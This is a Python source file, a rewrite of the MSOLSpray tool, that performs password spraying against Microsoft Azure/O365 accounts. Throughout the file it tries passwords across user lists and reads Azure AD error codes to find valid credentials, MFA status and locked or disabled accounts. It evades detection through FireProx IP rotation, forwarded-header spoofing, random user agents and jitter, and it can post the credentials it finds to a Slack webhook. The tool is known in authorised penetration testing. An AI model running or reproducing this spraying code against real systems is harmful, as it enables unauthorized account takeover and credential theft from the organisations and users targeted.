#!/usr/bin/env python3
import requests
import argparse
import time
from math import trunc
from random import randrange, shuffle
from fake_useragent import UserAgent
from uuid import uuid4

description = """
This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!

This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020

This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt

TIPS:
[1] When using along with FireProx, pass option -H "X-My-X-Forwarded-For: 127.0.0.1" to spoof origin IP.
"""


class text_colors:
    """Helper class to make colorizing easy."""

    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


class SlackWebhook:
    """Helper class for sending posts to Slack using webhooks."""

    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    # Post a simple update to slack
    def post(self, text):
        block = f"```\n{text}\n```"
        payload = {
            "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": block}}]
        }
        status = self.__post_payload(payload)
        return status

    # Post a json payload to slack webhook URL
    def __post_payload(self, payload):
        response = requests.post(self.webhook_url, json=payload)
        if response.status_code != 200:
            print(
                "%s[Error] %s%s"
                % (
                    text_colors.red,
                    "Could not send notification to Slack",
                    text_colors.reset,
                )
            )


def notify(webhook, text):
    """Send notifications using Webhooks.

    Args:
        webhook (str): Webhook endpoint
        text (str): Text to be sent
    """
    notifier = SlackWebhook(webhook)
    try:
        notifier.post(text)
    except BaseException:
        pass


def get_list_from_file(file_):
    """Create a list from the contents of a file.

    Args:
        file_ (str): Input file name

    Returns:
        List[str]: Content of input file splitted by lines
    """
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_


def assertions(args):
    """Make assertions about the provided args.

    Args:
        args (optparse_parser.Values): parsed args as returned by argparse.parse_args
    """
    assert args.sleep >= 0
    assert args.pause >= 0
    assert args.jitter in range(101)
    assert args.max_lockout >= 0


parser = argparse.ArgumentParser(
    description=description,
    epilog=epilog,
    formatter_class=argparse.RawDescriptionHelpFormatter,
)

group_user = parser.add_mutually_exclusive_group(required=True)
group_user.add_argument("-u", "--username", type=str, help="Single username")
group_user.add_argument(
    "-U",
    "--usernames",
    type=str,
    metavar="FILE",
    help="File containing usernames in the format 'user@domain'.",
)
group_password = parser.add_mutually_exclusive_group(required=True)
group_password.add_argument("-p", "--password", type=str, help="Single password.")
group_password.add_argument(
    "-P",
    "--passwords",
    type=str,
    help="File containing passwords, one per line.",
    metavar="FILE",
)
parser.add_argument(
    "-o",
    "--out",
    metavar="OUTFILE",
    default="valid_creds.txt",
    help="A file to output valid results to (default: %(default)s).",
)
parser.add_argument(
    "--url",
    default="https://login.microsoft.com",
    help=("A comma-separated list of URL(s) to spray against (default: %(default)s)."
        " Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from."),
)
parser.add_argument(
    "-f",
    "--force",
    action="store_true",
    help="Forces the spray to continue and not stop when multiple account lockouts are detected.",
)
parser.add_argument(
    "--shuffle",
    action="store_true",
    help="Shuffle user list.",
)
parser.add_argument(
    "-a",
    "--auto-remove",
    dest="auto_remove",
    default=0,
    type=int,
    choices=[0, 1, 2],
    help="Auto remove accounts from next iterations (0: valid credentials (default), 1: previous + nonexistent/disabled, 2: previous + locked).",
)
parser.add_argument(
    "--notify",
    type=str,
    help="Slack webhook for sending notifications about results (default: %(default)s).",
    default=None,
    required=False,
)
parser.add_argument(
    "--notify-actions",
    type=str,
    dest="notify_actions",
    help="Slack webhook for sending notifications about needed actions (default: same as --notify).",
    default=None,
    required=False,
)
parser.add_argument(
    "-s",
    "--sleep",
    default=0,
    type=int,
    help="Sleep this many seconds between tries (default: %(default)s).",
)
parser.add_argument(
    "--pause",
    default=15,
    type=float,
    help="Pause (in minutes) between each iteration (default: %(default)s).",
)
parser.add_argument(
    "-j",
    "--jitter",
    type=int,
    default=0,
    help="Maximum of additional delay given in percentage over base delay (default: %(default)s).",
)
parser.add_argument(
    "-l",
    "--max-lockout",
    default=10,
    metavar="PERCENT",
    type=int,
    dest="max_lockout",
    help="Maximum lockouts (in percent) to be observed before ask to abort execution. (default: %(default)s).",
)
parser.add_argument(
    "-H",
    "--header",
    help="Extra header to include in the request (can be used multiple times).",
    action="append",
    dest="headers",
)
parser.add_argument(
    "-A",
    "--user-agent",
    default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    dest="user_agent",
    metavar="NAME",
    help='Send User-Agent %(metavar)s to server (default: "%(default)s").',
)
parser.add_argument(
    "--rua", action="store_true", help="Send random User-Agent in each request."
)
parser.add_argument(
    "-v",
    "--verbose",
    action="store_true",
    help="Prints usernames that could exist in case of invalid password.",
)

args = parser.parse_args()
assertions(args)

args.pause = args.pause * 60
args.jitter += 1
if args.notify and args.notify_actions is None:
    args.notify_actions = args.notify

usernames = [args.username] if args.username else get_list_from_file(args.usernames)
passwords = [args.password] if args.password else get_list_from_file(args.passwords)

args.url = args.url.split(',')

interrupt = False
url_idx = 0
start_time = time.strftime("%Y%m%d%H%M%S")

for pindex, password in enumerate(passwords):
    if interrupt:
        break
    if pindex > 0 and args.pause > 0:
        print(f"[-] Sleeping {args.pause/60} minutes until next iteration")
        time.sleep(args.pause + args.pause * (randrange(args.jitter) / 100))
    # reset variables
    results = ""
    results_list = []
    username_counter = 0
    username_count = len(usernames)
    lockout_question = False
    lockout_max = trunc((args.max_lockout / 100) * username_count)
    lockout_counter = 0

    print(f"There are {username_count} users in total to spray,")
    print("Now spraying Microsoft Online.")
    print(f"Current date and time: {time.ctime()}")
    print(f"[*] Spraying password: {password}")
    if args.shuffle:
        shuffle(usernames)
    for uindex, username in enumerate(usernames):
        if username_counter > 0 and args.sleep > 0:
            time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))

        username_counter += 1
        print(f"{username_counter} of {username_count} users tested", end="\r")

        body = {
            "resource": "https://graph.windows.net",
            "client_id": str(
                uuid4()
            ),  # random uuid like '881cea63-30f9-4db0-ae1a-7bec94df9368'
            "client_info": "1",
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "openid",
        }

        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        # include custom headers
        if args.headers:
            for header in args.headers:
                h, v = header.split(":", 1)
                headers[h.strip()] = v.strip()
        # set user-agent
        if args.rua:
            ua = UserAgent(fallback=args.user_agent)  # avoid exception with fallback
            headers["User-Agent"] = ua.random
        else:
            headers["User-Agent"] = args.user_agent

        # rotate over URLs
        url = args.url[url_idx % len(args.url)]
        url_idx += 1

        r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)

        if r.status_code == 200:
            print(
                f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
            )
            results += f"{username} : {password}\n"
            results_list.append(f"{username}:{password}")
            usernames.remove(username)
        else:
            resp = r.json()
            error = resp["error_description"]

            if "AADSTS50126" in error:
                if args.verbose:
                    print(
                        f"VERBOSE: Invalid username or password. Username: {username} could exist."
                    )
                continue

            elif "AADSTS50128" in error or "AADSTS50059" in error:
                print(
                    f"{text_colors.yellow}WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.{text_colors.reset}"
                )

            elif "AADSTS50034" in error:
                print(
                    f"{text_colors.yellow}WARNING! The user {username} doesn't exist.{text_colors.reset}"
                )
                if args.auto_remove > 0:
                    usernames.remove(username)

            elif "AADSTS50079" in error or "AADSTS50076" in error:
                # Microsoft MFA response
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(f"{username}:{password}")
                usernames.remove(username)

            elif "AADSTS50158" in error:
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(f"{username}:{password}")
                usernames.remove(username)

            elif "AADSTS50053" in error:
                # Locked out account or Smart Lockout in place
                print(
                    f"{text_colors.yellow}WARNING! The account {username} appears to be locked.{text_colors.reset}"
                )
                lockout_counter += 1
                if args.auto_remove > 1:
                    usernames.remove(username)

            elif "AADSTS50057" in error:
                # Disabled account
                print(
                    f"{text_colors.yellow}WARNING! The account {username} appears to be disabled.{text_colors.reset}"
                )
                if args.auto_remove > 0:
                    usernames.remove(username)

            elif "AADSTS50055" in error:
                # User password is expired
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The user's password is expired.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(f"{username}:{password}")
                usernames.remove(username)

            elif "AADSTS700016" in error:
                # Application not found in directory (probably because random-generated uuid above)
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(f"{username}:{password}")
                usernames.remove(username)

            else:
                # Unknown errors
                print(f"Got an error we haven't seen yet for user {username}")
                print(error)

        # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
        if (
            not args.force
            and lockout_counter >= lockout_max
            and lockout_question == False
        ):
            print(
                f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
            )
            print(
                f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
            )
            if args.notify_actions:
                notify(
                    args.notify_actions,
                    "[MSOLSpray] Multiple account lockouts detected! Waiting for user interaction...",
                )
            yes = {"yes", "y"}
            no = {"no", "n", ""}
            lockout_question = True
            choice = "X"
            while choice not in no and choice not in yes:
                choice = input("[Y/N] (default is N): ").lower()

            if choice in no:
                print("Cancelling the password spray.")
                print(
                    "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                )
                interrupt = True
                break

            # else: continue even though lockout is detected
    # end of user iteration
    # write current users to file
    with open(start_time + "_currentusers.txt", "w") as user_file:
        usernames.sort()
        user_file.write("\n".join(usernames))

    if results != "":
        with open(args.out, "a") as out_file:
            out_file.write(results)
        print(f"Results have been written to {args.out}.")
        if args.notify:
            msg = "Found valid credentials! (-.^)\n\n"
            msg += "\n".join(results_list)
            notify(args.notify, msg)
        results = ""
        results_list.clear()
